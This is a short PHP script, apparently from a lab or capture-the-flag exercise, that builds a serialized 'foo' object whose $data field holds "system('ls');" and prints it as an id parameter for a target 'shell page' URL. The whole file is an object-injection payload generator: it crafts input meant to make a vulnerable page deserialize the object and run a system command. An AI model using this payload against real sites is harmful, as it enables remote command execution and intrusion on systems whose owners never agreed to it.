<?php

class foo{
    #public $data="phpinfo();";
    public $data="system('ls');";
}
$a=new foo;
$b=serialize($a);
echo "please visit uri:\n"."[your shell page url]"."?id=".$b;
